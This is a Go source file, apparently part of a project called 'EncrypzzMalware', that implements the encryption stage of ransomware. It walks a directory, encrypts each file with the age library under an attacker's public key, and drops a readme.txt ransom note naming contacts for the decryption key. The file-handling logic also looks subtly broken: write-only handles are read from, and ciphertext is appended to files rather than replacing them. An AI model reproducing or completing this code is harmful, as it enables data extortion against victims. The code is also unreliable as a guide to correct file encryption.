package encrypter

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"log"
	"os"

	"EncrypzzMalware/explorer"

	"filippo.io/age"
)

func Encrypter(cryptoKey string, dir string) {
	files := explorer.MapFiles(dir)

	for _, v := range files {
		file, err := os.OpenFile(v, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
		if err != nil {
			continue
		}

		var b bytes.Buffer
		buff := bufio.NewWriter(&b)

		err = Encrypt(file, buff, cryptoKey)
		if err != nil {
			continue
		}
		_, err = io.Copy(file, &b)
		if err != nil {
			fmt.Println("Error writing buffer to file:", err)
			return
		}

	}

	msg := "Your files have been encrypted.\nContact " + "RabbITCybErSeC or MaartendeKruijf" + " to get the decryption key."
	err := os.WriteFile(os.Getenv("HOME")+dir+"/readme.txt", []byte(msg), 0o644)
	if err != nil {
		log.Fatalln(err)
	}
}

func Encrypt(file *os.File, out io.Writer, publickey string) error {
	recipient, _ := age.ParseX25519Recipient(publickey)
	w, err := age.Encrypt(out, recipient)

	file.WriteTo(w)

	if err != nil {
		return err
	}
	defer w.Close()
	return nil
}
